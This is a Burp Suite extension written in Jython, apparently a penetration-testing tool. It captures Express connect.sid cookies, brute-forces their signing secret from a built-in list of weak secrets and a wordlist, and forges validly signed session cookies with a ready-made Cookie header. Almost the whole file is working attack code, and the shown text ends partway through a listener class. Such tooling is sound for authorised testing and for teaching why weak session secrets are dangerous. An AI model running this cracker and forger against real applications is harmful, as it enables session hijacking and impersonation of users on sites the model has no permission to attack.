# -*- coding: utf-8 -*-
#
# Burp Suite Extension (Jython / Python 2.7)
# Express Session Cracker - Comprehensive toolkit for connect.sid cookies
#
# Features:
#   - Passive capture of connect.sid cookies
#   - Wordlist-based secret cracking with speed stats
#   - Quick check against common default secrets
#   - Cookie forger to create signed sessions
#   - Session data decoder
#   - Manual cookie input
#   - Context menu integration
#   - Export capabilities
#
# Load via: Extender -> Extensions -> Add -> Type: Python (Jython)
# Ensure Jython standalone jar is configured in Burp: Extender -> Options.

from burp import IBurpExtender, IHttpListener, ITab, IContextMenuFactory

from javax.swing import (
    JPanel, JLabel, JTextField, JButton, JScrollPane,
    JTextArea, JTable, JSplitPane, JFileChooser, BoxLayout,
    SwingUtilities, BorderFactory, JTabbedPane, JCheckBox,
    JOptionPane, JMenuItem, JPopupMenu
)
from javax.swing.table import DefaultTableModel
from java.awt import BorderLayout, FlowLayout, Dimension, Font, GridBagLayout, GridBagConstraints, Insets
from java.awt.event import ActionListener, MouseAdapter
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit
from java.lang import Runnable
from java.io import File

import base64
import hashlib
import hmac
import urllib
import threading
import time
import json
import re


# ─────────────────────────────────────────────────────────────────────────────
# Common Express Secrets (defaults, common weak passwords, etc.)
# ─────────────────────────────────────────────────────────────────────────────

COMMON_SECRETS = [
    # Express/Node defaults and examples
    "keyboard cat",
    "secret",
    "session secret",
    "session_secret",
    "sessionSecret",
    "express",
    "express-session",
    "my secret",
    "mysecret",
    "my-secret",
    "supersecret",
    "super secret",
    "topsecret",
    "changeme",
    "changeit",
    "password",
    "password123",
    "123456",
    "12345678",
    "abc123",
    "qwerty",
    "admin",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "login",
    "passw0rd",
    "hello",
    "shadow",
    "sunshine",
    "princess",
    "development",
    "dev",
    "test",
    "testing",
    "debug",
    "production",
    "staging",
    "local",
    "localhost",
    "default",
    "demo",
    "example",
    "sample",
    "temp",
    "temporary",
    "xxx",
    "asdf",
    "asdfgh",
    "zxcvbn",
    "1234567890",
    "0987654321",
    "qwertyuiop",
    # Common environment variable patterns
    "SESSION_SECRET",
    "EXPRESS_SECRET",
    "APP_SECRET",
    "COOKIE_SECRET",
    "JWT_SECRET",
    # From tutorials/docs
    "shhhhh",
    "shhhhhhhhhhhhhh",
    "very secret string",
    "this is a secret",
    "replace this with a real secret",
    "your-secret-key",
    "your_secret_key",
    "my-super-secret",
    "some-secret",
    "a]4@TZyeP3Zb",  # Common in old tutorials
]


# ─────────────────────────────────────────────────────────────────────────────
# Cracking utilities (ported from crack-connect-sid.py for Python 2 / Jython)
# ─────────────────────────────────────────────────────────────────────────────

def b64_nopad(data):
    """Standard base64, no trailing '=' padding."""
    return base64.b64encode(data).rstrip("=")


def b64url_nopad(data):
    """URL-safe base64, no trailing '=' padding."""
    return base64.urlsafe_b64encode(data).rstrip("=")


def b64_decode_permissive(s):
    """Decode base64, adding padding if needed."""
    # Add padding
    padding = 4 - (len(s) % 4)
    if padding != 4:
        s += "=" * padding
    try:
        return base64.b64decode(s)
    except:
        try:
            return base64.urlsafe_b64decode(s)
        except:
            return None


def parse_connect_sid(cookie_value):
    """
    Accepts either:
      - full "connect.sid=..." string
      - just the cookie value part
    Returns (sid, sig) or raises ValueError.
    """
    s = cookie_value.strip()

    # Strip cookie name if present
    if "connect.sid=" in s:
        s = s.split("connect.sid=", 1)[1].strip()

    # Handle multiple cookies
    if ";" in s:
        s = s.split(";", 1)[0].strip()

    # URL decode
    s = urllib.unquote(s)

    if not s.startswith("s:"):
        raise ValueError("Cookie missing 's:' prefix (not signed?)")

    body = s[2:]  # drop "s:"
    if "." not in body:
        raise ValueError("Missing '.' separator between SID and signature")

    # Signature is after the LAST dot
    sid, sig = body.rsplit(".", 1)
    if not sid or not sig:
        raise ValueError("Empty SID or signature")
    return sid, sig


def compute_signatures(sid, secret):
    """
    Compute both standard and URL-safe base64 signatures for a given SID/secret.
    Express uses HMAC-SHA256.
    """
    mac = hmac.new(secret.encode("utf-8"), sid.encode("utf-8"), hashlib.sha256).digest()
    return (b64_nopad(mac), b64url_nopad(mac))


def sign_cookie(sid, secret):
    """Sign a session ID with the given secret, returning the full cookie value."""
    mac = hmac.new(secret.encode("utf-8"), sid.encode("utf-8"), hashlib.sha256).digest()
    sig = b64_nopad(mac)
    return "s:" + sid + "." + sig


def decode_session_data(sid):
    """
    Attempt to decode session data from the SID.
    Express-session can store session data in various ways.
    Returns a dict with decoded info or error message.
    """
    result = {
        "raw": sid,
        "decoded": None,
        "type": "unknown",
        "json": None,
        "error": None
    }
    
    # Try base64 decode
    decoded = b64_decode_permissive(sid)
    if decoded:
        result["decoded"] = decoded
        try:
            # Try to decode as UTF-8 string
            decoded_str = decoded.decode("utf-8")
            result["decoded"] = decoded_str
            result["type"] = "base64-string"
            
            # Try JSON parse
            try:
                json_data = json.loads(decoded_str)
                result["json"] = json_data
                result["type"] = "base64-json"
            except:
                pass
        except:
            result["type"] = "base64-binary"
            result["decoded"] = decoded.encode("hex")
    else:
        # Not base64, might be a session store key (like connect-redis)
        result["type"] = "session-store-key"
        result["decoded"] = sid
    
    return result


def count_wordlist_lines(path):
    """Count lines in a wordlist file."""
    try:
        count = 0
        with open(path, "r") as f:
            for _ in f:
                count += 1
        return count
    except:
        return -1


def crack_cookie(sid, target_sig, wordlist_path, progress_callback=None, cancel_check=None):
    """
    Attempt to find the secret for a given SID and signature.
    
    Args:
        sid: The session ID portion of the cookie
        target_sig: The signature to match
        wordlist_path: Path to wordlist file
        progress_callback: Optional function(tried, current_word, speed) for progress updates
        cancel_check: Optional function() that returns True if we should stop
    
    Returns:
        (secret, tried_count, elapsed_time) if found, (None, tried_count, elapsed_time) otherwise
    """
    tried = 0
    start_time = time.time()
    last_update = start_time
    
    with open(wordlist_path, "r") as f:
        for line in f:
            if cancel_check and cancel_check():
                return (None, tried, time.time() - start_time)
            
            secret = line.rstrip("\n").rstrip("\r")
            if not secret.strip():
                continue
            
            tried += 1
            std_sig, url_sig = compute_signatures(sid, secret)
            
            if target_sig == std_sig or target_sig == url_sig:
                return (secret, tried, time.time() - start_time)
            
            current_time = time.time()
            if progress_callback and (current_time - last_update) >= 0.5:
                elapsed = current_time - start_time
                speed = tried / elapsed if elapsed > 0 else 0
                progress_callback(tried, secret, speed)
                last_update = current_time
    
    return (None, tried, time.time() - start_time)


def crack_with_common_secrets(sid, target_sig):
    """
    Quick check against common secrets.
    Returns (secret, attempts) if found, (None, attempts) otherwise.
    """
    for i, secret in enumerate(COMMON_SECRETS):
        std_sig, url_sig = compute_signatures(sid, secret)
        if target_sig == std_sig or target_sig == url_sig:
            return (secret, i + 1)
    return (None, len(COMMON_SECRETS))


# ─────────────────────────────────────────────────────────────────────────────
# Burp Extension
# ─────────────────────────────────────────────────────────────────────────────

class BurpExtender(IBurpExtender, IHttpListener, ITab, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()

        callbacks.setExtensionName("Express Session Cracker")
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)

        self.stdout = callbacks.getStdout()
        self.stderr = callbacks.getStderr()

        # Store captured cookies: list of (url, cookie_value, sid, sig)
        self.captured_cookies = []
        self.cookie_lock = threading.Lock()
        
        # Store discovered secrets: dict of sig -> secret
        self.discovered_secrets = {}
        self.secrets_lock = threading.Lock()
        
        # Cracking state
        self.cracking = False
        self.cancel_requested = False

        # Build UI
        self._build_ui()
        callbacks.addSuiteTab(self)

        self.stdout.println("[*] Express Session Cracker loaded")
        self.stdout.println("[*] Monitoring for connect.sid cookies...")
        self.stdout.println("[*] Right-click requests to send cookies to cracker")

    def getTabCaption(self):
        return "Express Cracker"

    def getUiComponent(self):
        return self.main_panel

    def _build_ui(self):
        self.main_panel = JPanel(BorderLayout(5, 5))
        self.main_panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5))

        # Create tabbed pane for different functions
        self.tabs = JTabbedPane()
        
        # Tab 1: Capture & Crack
        self.tabs.addTab("Capture & Crack", self._build_crack_panel())
        
        # Tab 2: Cookie Forger
        self.tabs.addTab("Cookie Forger", self._build_forger_panel())
        
        # Tab 3: Session Decoder
        self.tabs.addTab("Session Decoder", self._build_decoder_panel())
        
        # Tab 4: Settings & Export
        self.tabs.addTab("Settings & Export", self._build_settings_panel())
        
        self.main_panel.add(self.tabs, BorderLayout.CENTER)

        # Status bar at bottom
        self.status_label = JLabel("Ready | Common secrets: %d | Right-click requests to add cookies" % len(COMMON_SECRETS))
        self.status_label.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5))
        self.main_panel.add(self.status_label, BorderLayout.SOUTH)

    def _build_crack_panel(self):
        """Build the main capture & crack panel."""
        panel = JPanel(BorderLayout(5, 5))
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5))

        # ─── Top Panel: Wordlist configuration ───
        top_panel = JPanel(BorderLayout(5, 5))
        top_panel.setBorder(BorderFactory.createTitledBorder("Wordlist Configuration"))
        
        wordlist_row = JPanel(FlowLayout(FlowLayout.LEFT, 5, 5))
        wordlist_row.add(JLabel("Wordlist:"))
        self.wordlist_field = JTextField(35)
        self.wordlist_field.setToolTipText("Path to wordlist file (one secret per line)")
        wordlist_row.add(self.wordlist_field)

        browse_btn = JButton("Browse...")
        browse_btn.addActionListener(BrowseListener(self))
        wordlist_row.add(browse_btn)
        
        self.wordlist_info_label = JLabel("")
        wordlist_row.add(self.wordlist_info_label)
        
        top_panel.add(wordlist_row, BorderLayout.NORTH)
        
        options_row = JPanel(FlowLayout(FlowLayout.LEFT, 5, 5))
        self.quick_check_cb = JCheckBox("Try common secrets first", True)
        self.quick_check_cb.setToolTipText("Check %d common secrets before wordlist" % len(COMMON_SECRETS))
        options_row.add(self.quick_check_cb)
        top_panel.add(options_row, BorderLayout.SOUTH)

        panel.add(top_panel, BorderLayout.NORTH)

        # ─── Center: Split pane with cookies table and results ───
        center_split = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        center_split.setResizeWeight(0.5)

        # Cookies table
        cookies_panel = JPanel(BorderLayout(5, 5))
        cookies_panel.setBorder(BorderFactory.createTitledBorder("Captured Cookies"))

        self.table_model = DefaultTableModel(["#", "URL", "SID (truncated)", "Signature", "Secret"], 0)
        self.cookies_table = JTable(self.table_model)
        self.cookies_table.getColumnModel().getColumn(0).setPreferredWidth(40)
        self.cookies_table.getColumnModel().getColumn(1).setPreferredWidth(200)
        self.cookies_table.getColumnModel().getColumn(2).setPreferredWidth(180)
        self.cookies_table.getColumnModel().getColumn(3).setPreferredWidth(180)
        self.cookies_table.getColumnModel().getColumn(4).setPreferredWidth(120)
        
        # Double-click to decode
        self.cookies_table.addMouseListener(TableClickListener(self))
        
        cookies_scroll = JScrollPane(self.cookies_table)
        cookies_scroll.setPreferredSize(Dimension(800, 180))
        cookies_panel.add(cookies_scroll, BorderLayout.CENTER)

        # Buttons for cookie table
        cookie_btn_panel = JPanel(FlowLayout(FlowLayout.LEFT, 5, 5))
        
        add_manual_btn = JButton("Add Cookie Manually")
        add_manual_btn.addActionListener(AddManualListener(self))
        cookie_btn_panel.add(add_manual_btn)
        
        crack_btn = JButton("Crack Selected")
        crack_btn.addActionListener(CrackListener(self))
        cookie_btn_panel.add(crack_btn)

        crack_all_btn = JButton("Crack All")
        crack_all_btn.addActionListener(CrackAllListener(self))
        cookie_btn_panel.add(crack_all_btn)
        
        quick_check_btn = JButton("Quick Check Only")
        quick_check_btn.setToolTipText("Only try common secrets, no wordlist")
        quick_check_btn.addActionListener(QuickCheckListener(self))
        cookie_btn_panel.add(quick_check_btn)

        self.cancel_btn = JButton("Cancel")
        self.cancel_btn.addActionListener(CancelListener(self))
        self.cancel_btn.setEnabled(False)
        cookie_btn_panel.add(self.cancel_btn)

        clear_btn = JButton("Clear Table")
        clear_btn.addActionListener(ClearListener(self))
        cookie_btn_panel.add(clear_btn)

        cookies_panel.add(cookie_btn_panel, BorderLayout.SOUTH)
        center_split.setTopComponent(cookies_panel)

        # Results area
        results_panel = JPanel(BorderLayout(5, 5))
        results_panel.setBorder(BorderFactory.createTitledBorder("Cracking Results"))

        self.results_area = JTextArea()
        self.results_area.setEditable(False)
        self.results_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        results_scroll = JScrollPane(self.results_area)
        results_scroll.setPreferredSize(Dimension(800, 180))
        results_panel.add(results_scroll, BorderLayout.CENTER)
        
        results_btn_panel = JPanel(FlowLayout(FlowLayout.LEFT, 5, 5))
        copy_results_btn = JButton("Copy Results")
        copy_results_btn.addActionListener(CopyResultsListener(self))
        results_btn_panel.add(copy_results_btn)
        
        clear_results_btn = JButton("Clear Results")
        clear_results_btn.addActionListener(ClearResultsListener(self))
        results_btn_panel.add(clear_results_btn)
        
        results_panel.add(results_btn_panel, BorderLayout.SOUTH)

        center_split.setBottomComponent(results_panel)
        panel.add(center_split, BorderLayout.CENTER)

        return panel

    def _build_forger_panel(self):
        """Build the cookie forger panel."""
        panel = JPanel(BorderLayout(10, 10))
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
        
        # Instructions
        instructions = JLabel("<html><b>Cookie Forger</b> - Create signed connect.sid cookies using a known secret</html>")
        panel.add(instructions, BorderLayout.NORTH)
        
        # Main form
        form_panel = JPanel(GridBagLayout())
        form_panel.setBorder(BorderFactory.createTitledBorder("Forge Cookie"))
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST
        
        # Secret field
        gbc.gridx = 0
        gbc.gridy = 0
        form_panel.add(JLabel("Secret:"), gbc)
        
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self.forge_secret_field = JTextField(40)
        self.forge_secret_field.setToolTipText("The session secret (discovered or known)")
        form_panel.add(self.forge_secret_field, gbc)
        
        gbc.gridx = 2
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        use_discovered_btn = JButton("Use Discovered")
        use_discovered_btn.addActionListener(UseDiscoveredListener(self))
        form_panel.add(use_discovered_btn, gbc)
        
        # Session ID field
        gbc.gridx = 0
        gbc.gridy = 1
        form_panel.add(JLabel("Session ID:"), gbc)
        
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self.forge_sid_field = JTextField(40)
        self.forge_sid_field.setToolTipText("Session ID to sign (e.g., generated UUID or custom data)")
        form_panel.add(self.forge_sid_field, gbc)
        
        gbc.gridx = 2
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        gen_uuid_btn = JButton("Generate UUID")
        gen_uuid_btn.addActionListener(GenerateUUIDListener(self))
        form_panel.add(gen_uuid_btn, gbc)
        
        # Generate button
        gbc.gridx = 1
        gbc.gridy = 2
        gbc.fill = GridBagConstraints.NONE
        forge_btn = JButton("Generate Signed Cookie")
        forge_btn.addActionListener(ForgeListener(self))
        form_panel.add(forge_btn, gbc)
        
        # Output - raw cookie value
        gbc.gridx = 0
        gbc.gridy = 3
        form_panel.add(JLabel("Cookie Value:"), gbc)
        
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self.forge_output_field = JTextField(40)
        self.forge_output_field.setEditable(False)
        self.forge_output_field.setToolTipText("The signed cookie value (without URL encoding)")
        form_panel.add(self.forge_output_field, gbc)
        
        gbc.gridx = 2
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        copy_raw_btn = JButton("Copy")
        copy_raw_btn.addActionListener(CopyForgedListener(self, "raw"))
        form_panel.add(copy_raw_btn, gbc)
        
        # Output - URL encoded
        gbc.gridx = 0
        gbc.gridy = 4
        form_panel.add(JLabel("URL Encoded:"), gbc)
        
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self.forge_encoded_field = JTextField(40)
        self.forge_encoded_field.setEditable(False)
        self.forge_encoded_field.setToolTipText("URL-encoded cookie value (for use in Cookie header)")
        form_panel.add(self.forge_encoded_field, gbc)
        
        gbc.gridx = 2
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        copy_encoded_btn = JButton("Copy")
        copy_encoded_btn.addActionListener(CopyForgedListener(self, "encoded"))
        form_panel.add(copy_encoded_btn, gbc)
        
        # Full header
        gbc.gridx = 0
        gbc.gridy = 5
        form_panel.add(JLabel("Full Header:"), gbc)
        
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self.forge_header_field = JTextField(40)
        self.forge_header_field.setEditable(False)
        self.forge_header_field.setToolTipText("Complete Cookie header ready to use")
        form_panel.add(self.forge_header_field, gbc)
        
        gbc.gridx = 2
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        copy_header_btn = JButton("Copy")
        copy_header_btn.addActionListener(CopyForgedListener(self, "header"))
        form_panel.add(copy_header_btn, gbc)
        
        panel.add(form_panel, BorderLayout.CENTER)
        
        return panel

    def _build_decoder_panel(self):
        """Build the session decoder panel."""
        panel = JPanel(BorderLayout(10, 10))
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
        
        # Input section
        input_panel = JPanel(BorderLayout(5, 5))
        input_panel.setBorder(BorderFactory.createTitledBorder("Cookie Input"))
        
        input_row = JPanel(FlowLayout(FlowLayout.LEFT, 5, 5))
        input_row.add(JLabel("Cookie/SID:"))
        self.decode_input_field = JTextField(50)
        self.decode_input_field.setToolTipText("Paste connect.sid cookie value or just the SID portion")
        input_row.add(self.decode_input_field)
        
        decode_btn = JButton("Decode")
        decode_btn.addActionListener(DecodeListener(self))
        input_row.add(decode_btn)
        
        input_panel.add(input_row, BorderLayout.CENTER)
        panel.add(input_panel, BorderLayout.NORTH)
        
        # Output section
        output_panel = JPanel(BorderLayout(5, 5))
        output_panel.setBorder(BorderFactory.createTitledBorder("Decoded Session Data"))
        
        self.decode_output_area = JTextArea(15, 60)
        self.decode_output_area.setEditable(False)
        self.decode_output_area.setFont(Font("Monospaced", Font.PLAIN, 12))
        output_panel.add(JScrollPane(self.decode_output_area), BorderLayout.CENTER)
        
        panel.add(output_panel, BorderLayout.CENTER)
        
        return panel

    def _build_settings_panel(self):
        """Build settings and export panel."""
        panel = JPanel(BorderLayout(10, 10))
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
        
        # Export section
        export_panel = JPanel()
        export_panel.setLayout(BoxLayout(export_panel, BoxLayout.Y_AXIS))
        export_panel.setBorder(BorderFactory.createTitledBorder("Export"))
        
        export_row1 = JPanel(FlowLayout(FlowLayout.LEFT, 5, 5))
        export_cookies_btn = JButton("Export Cookies as JSON")
        export_cookies_btn.addActionListener(ExportCookiesListener(self))
        export_row1.add(export_cookies_btn)
        
        export_secrets_btn = JButton("Export Discovered Secrets")
        export_secrets_btn.addActionListener(ExportSecretsListener(self))
        export_row1.add(export_secrets_btn)
        
        export_panel.add(export_row1)
        
        panel.add(export_panel, BorderLayout.NORTH)
        
        # Common secrets list
        secrets_panel = JPanel(BorderLayout(5, 5))
        secrets_panel.setBorder(BorderFactory.createTitledBorder("Common Secrets List (%d entries)" % len(COMMON_SECRETS)))
        
        secrets_area = JTextArea(15, 60)
        secrets_area.setEditable(False)
        secrets_area.setFont(Font("Monospaced", Font.PLAIN, 11))
        secrets_area.setText("\n".join(COMMON_SECRETS))
        secrets_panel.add(JScrollPane(secrets_area), BorderLayout.CENTER)
        
        panel.add(secrets_panel, BorderLayout.CENTER)
        
        return panel

    # ─── Utility Methods ───

    def log_result(self, message):
        """Thread-safe logging to results area."""
        def update():
            self.results_area.append(message + "\n")
            self.results_area.setCaretPosition(self.results_area.getDocument().getLength())
        SwingUtilities.invokeLater(UpdateRunnable(update))

    def set_status(self, message):
        """Thread-safe status update."""
        def update():
            self.status_label.setText(message)
        SwingUtilities.invokeLater(UpdateRunnable(update))

    def add_cookie_to_table(self, url, cookie_value, sid, sig):
        """Thread-safe addition of cookie to table."""
        def update():
            row_num = self.table_model.getRowCount() + 1
            sid_display = sid[:25] + "..." if len(sid) > 25 else sid
            
            # Check if we already have a secret for this sig
            with self.secrets_lock:
                secret = self.discovered_secrets.get(sig, "")
            
            self.table_model.addRow([str(row_num), url, sid_display, sig, secret])
        SwingUtilities.invokeLater(UpdateRunnable(update))

    def update_table_secret(self, sig, secret):
        """Update the secret column for a given signature."""
        def update():
            for row in range(self.table_model.getRowCount()):
                if self.table_model.getValueAt(row, 3) == sig:
                    self.table_model.setValueAt(secret, row, 4)
        SwingUtilities.invokeLater(UpdateRunnable(update))

    def copy_to_clipboard(self, text):
        """Copy text to system clipboard."""
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(text), None)

    def update_wordlist_info(self):
        """Update wordlist line count display."""
        path = self.wordlist_field.getText().strip()
        if path:
            count = count_wordlist_lines(path)
            if count >= 0:
                self.wordlist_info_label.setText("(%s lines)" % "{:,}".format(count))
            else:
                self.wordlist_info_label.setText("(file not found)")
        else:
            self.wordlist_info_label.setText("")

    # ─── Context Menu ───

    def createMenuItems(self, invocation):
        """Create context menu items for Burp."""
        menu_items = []
        
        # Get selected messages
        messages = invocation.getSelectedMessages()
        if not messages:
            return None
        
        menu_item = JMenuItem("Send cookie to Express Cracker")
        menu_item.addActionListener(ContextMenuListener(self, messages))
        menu_items.append(menu_item)
        
        return menu_items

    def extract_cookies_from_messages(self, messages):
        """Extract connect.sid cookies from HTTP messages."""
        found = 0
        for message in messages:
            # Check request
            request = message.getRequest()
            if request:
                req_info = self.helpers.analyzeRequest(request)
                for header in req_info.getHeaders():
                    if header.lower().startswith("cookie:"):
                        cookie_str = header[7:].strip()
                        for part in cookie_str.split(";"):
                            part = part.strip()
                            if part.lower().startswith("connect.sid="):
                                try:
                                    cookie_value = part.split("=", 1)[1]
                                    sid, sig = parse_connect_sid(cookie_value)
                                    url = self._safe_url(message)
                                    
                                    with self.cookie_lock:
                                        if not any(c[3] == sig for c in self.captured_cookies):
                                            self.captured_cookies.append((url, cookie_value, sid, sig))
                                            self.add_cookie_to_table(url, cookie_value, sid, sig)
                                            found += 1
                                except:
                                    pass
            
            # Check response Set-Cookie
            response = message.getResponse()
            if response:
                resp_info = self.helpers.analyzeResponse(response)
                for header in resp_info.getHeaders():
                    if header.lower().startswith("set-cookie:"):
                        header_value = header[len("Set-Cookie:"):].strip()
                        if header_value.lower().startswith("connect.sid="):
                            try:
                                cookie_value = header_value.split(";")[0].split("=", 1)[1]
                                sid, sig = parse_connect_sid(cookie_value)
                                url = self._safe_url(message)
                                
                                with self.cookie_lock:
                                    if not any(c[3] == sig for c in self.captured_cookies):
                                        self.captured_cookies.append((url, cookie_value, sid, sig))
                                        self.add_cookie_to_table(url, cookie_value, sid, sig)
                                        found += 1
                            except:
                                pass
        
        return found

    # ─── HTTP Listener ───

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return

        response = messageInfo.getResponse()
        if response is None:
            return

        resp_info = self.helpers.analyzeResponse(response)
        headers = resp_info.getHeaders()

        for h in headers:
            if not h.lower().startswith("set-cookie:"):
                continue

            header_value = h[len("Set-Cookie:"):].strip()
            lower_val = header_value.lower()

            if not lower_val.startswith("connect.sid="):
                continue

            # Parse cookie attributes
            parts = [p.strip() for p in header_value.split(";")]
            cookie_kv = parts[0]
            attrs = [p.strip() for p in parts[1:]]

            http_only = any(a.lower() == "httponly" for a in attrs)
            secure = any(a.lower() == "secure" for a in attrs)
            samesite = None
            for a in attrs:
                if a.lower().startswith("samesite="):
                    samesite = a.split("=", 1)[1].strip()
                    break

            url = self._safe_url(messageInfo)

            self.stdout.println("[*] Found connect.sid on %s" % url)
            self.stdout.println("    HttpOnly=%s Secure=%s SameSite=%s" % (
                http_only, secure, (samesite if samesite else "NONE/unspecified")
            ))

            # Flag missing security attributes
            if (not http_only) or (not secure):
                problems = []
                if not http_only:
                    problems.append("missing HttpOnly")
                if not secure:
                    problems.append("missing Secure")
                self.stderr.println("[!] Weak flags on %s: %s" % (url, ", ".join(problems)))

            # Extract and store cookie for cracking
            try:
                cookie_value = cookie_kv.split("=", 1)[1]
                sid, sig = parse_connect_sid(cookie_value)
                
                with self.cookie_lock:
                    # Avoid duplicates (same sig)
                    if not any(c[3] == sig for c in self.captured_cookies):
                        self.captured_cookies.append((url, cookie_value, sid, sig))
                        self.add_cookie_to_table(url, cookie_value, sid, sig)
                        self.stdout.println("[+] Cookie captured for cracking")
            except Exception as e:
                self.stderr.println("[!] Failed to parse cookie: %s" % str(e))

    def _safe_url(self, messageInfo):
        try:
            service = messageInfo.getHttpService()
            return "%s://%s:%d" % (service.getProtocol(), service.getHost(), service.getPort())
        except:
            return "<unknown-service>"

    # ─── Cracking ───

    def start_crack(self, indices, quick_only=False):
        """Start cracking cookies at given indices (0-based)."""
        wordlist = self.wordlist_field.getText().strip()
        if not quick_only and not wordlist:
            self.log_result("[!] Please specify a wordlist path")
            return

        with self.cookie_lock:
            if not self.captured_cookies:
                self.log_result("[!] No cookies captured yet")
                return
            
            to_crack = []
            for i in indices:
                if 0 <= i < len(self.captured_cookies):
                    to_crack.append(self.captured_cookies[i])

        if not to_crack:
            self.log_result("[!] No valid cookies selected")
            return

        self.cracking = True
        self.cancel_requested = False
        self.cancel_btn.setEnabled(True)

        # Run in background thread
        thread = threading.Thread(
            target=self._crack_thread, 
            args=(to_crack, wordlist, self.quick_check_cb.isSelected(), quick_only)
        )
        thread.daemon = True
        thread.start()

    def _crack_thread(self, cookies, wordlist_path, try_common, quick_only):
        """Background thread for cracking."""
        try:
            self.log_result("=" * 70)
            self.log_result("[*] Starting crack attempt on %d cookie(s)" % len(cookies))
            if try_common:
                self.log_result("[*] Will try %d common secrets first" % len(COMMON_SECRETS))
            if not quick_only and wordlist_path:
                self.log_result("[*] Wordlist: %s" % wordlist_path)
            self.log_result("=" * 70)

            for url, cookie_value, sid, target_sig in cookies:
                if self.cancel_requested:
                    self.log_result("[!] Cancelled by user")
                    break

                self.log_result("")
                self.log_result("[*] Cracking cookie from: %s" % url)
                self.log_result("[*] SID length: %d, Signature: %s" % (len(sid), target_sig))
                
                found_secret = None
                total_tried = 0
                total_time = 0

                # Try common secrets first
                if try_common:
                    self.set_status("Quick check: trying common secrets...")
                    secret, tried = crack_with_common_secrets(sid, target_sig)
                    total_tried += tried
                    
                    if secret:
                        found_secret = secret
                        self.log_result("[+] FOUND via common secrets! Secret: %s" % secret)
                        self.log_result("[+] Found after %d attempts" % tried)
                
                # Try wordlist if not found and not quick_only
                if not found_secret and not quick_only and wordlist_path:
                    self.set_status("Cracking: %s" % url)

                    def progress(tried, word, speed):
                        self.set_status("Tried %d candidates (%.0f/sec)..." % (tried, speed))

                    def should_cancel():
                        return self.cancel_requested

                    try:
                        secret, tried, elapsed = crack_cookie(
                            sid, target_sig, wordlist_path,
                            progress_callback=progress,
                            cancel_check=should_cancel
                        )
                        total_tried += tried
                        total_time = elapsed

                        if secret:
                            found_secret = secret
                            speed = tried / elapsed if elapsed > 0 else 0
                            self.log_result("[+] SUCCESS! Secret found: %s" % secret)
                            self.log_result("[+] Attempts: %d in %.2fs (%.0f/sec)" % (tried, elapsed, speed))

                    except IOError as e:
                        self.log_result("[!] Error reading wordlist: %s" % str(e))
                    except Exception as e:
                        self.log_result("[!] Error: %s" % str(e))

                if found_secret:
                    # Store discovered secret
                    with self.secrets_lock:
                        self.discovered_secrets[target_sig] = found_secret
                    self.update_table_secret(target_sig, found_secret)
                    
                    # Burp alert
                    self.callbacks.issueAlert("Express secret found for %s: %s" % (url, found_secret))
                elif not self.cancel_requested:
                    self.log_result("[-] Secret not found (tried %d candidates)" % total_tried)

            self.log_result("")
            self.log_result("[*] Cracking complete")
            self.set_status("Ready | Common secrets: %d | Right-click requests to add cookies" % len(COMMON_SECRETS))

        finally:
            self.cracking = False
            def disable_cancel():
                self.cancel_btn.setEnabled(False)
            SwingUtilities.invokeLater(UpdateRunnable(disable_cancel))


# ─────────────────────────────────────────────────────────────────────────────
# UI Helpers (Jython requires explicit listener classes)
# ─────────────────────────────────────────────────────────────────────────────

class UpdateRunnable(Runnable):
    """Wrapper for SwingUtilities.invokeLater."""
    def __init__(self, func):
        self.func = func
    def run(self):
        self.func()


class BrowseListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        chooser = JFileChooser()
        chooser.setDialogTitle("Select Wordlist")
        if chooser.showOpenDialog(self.extender.main_panel) == JFileChooser.APPROVE_OPTION:
            self.extender.wordlist_field.setText(chooser.getSelectedFile().getAbsolutePath())
            self.extender.update_wordlist_info()


class AddManualListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender
    def actionPerformed(self, event):
        cookie = JOptionPane.showInputDialog(
            self.extender.main_panel,
            "Paste connect.sid cookie value:\n(e.g., s%3A... or the full connect.sid=... header)",
            "Add Cookie Manually",
            JOptionPane.PLAIN_MESSAGE
        )
        if cookie:
            try:
                sid, sig = parse_connect_sid(cookie)
                with self.extender.cookie_lock:
                    if any(c[3] == sig for c in self.extender.captured_cookies):
                        self.extender.log_result("[!] Cookie already exists in table")
                        return
                    self.extender.captured_cookies.append(("manual-entry", cookie, sid, sig))
                    self.extender.add_cookie_to_table("manual-entry", cookie, sid, sig)
                    self.extender.log_result("[+] Cookie added manually")
            except Exception as e:
                JOptionPane.showMessageDialog(
                    self.extender.main_panel,
                    "Failed to parse cookie: %s" % str(e),
                    "Parse Error",
                    JOptionPane.ERROR_MESSAGE
                )


class CrackListener(ActionListener):
    def __init__(self, extender):
